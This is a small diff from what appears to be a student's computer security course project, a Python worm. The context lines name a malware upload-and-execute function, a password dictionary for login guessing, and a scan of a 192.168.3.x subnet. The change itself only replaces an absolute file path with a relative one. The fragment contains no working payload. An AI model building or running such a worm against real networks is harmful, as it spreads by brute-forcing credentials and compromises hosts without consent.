@@ -55,7 +55,8 @@ def UploadAndExecuteMalware(malwareFile, scannerFile):
 
 print('******Starting worm******')
 
-loginDictionary = '/Users/omarsharif/IdeaProjects/USF/CS 683 (Computer Security)/Project1/venv/loginDictionary'
+#This should be full path not relative path, changed for purpose of github submission
+loginDictionary = './venv/loginDictionary'
 usernamePassword = ''
 ipAddressStart = '192.168.3.'
 finalIp = FindFinalIpAddress(ipAddressStart)
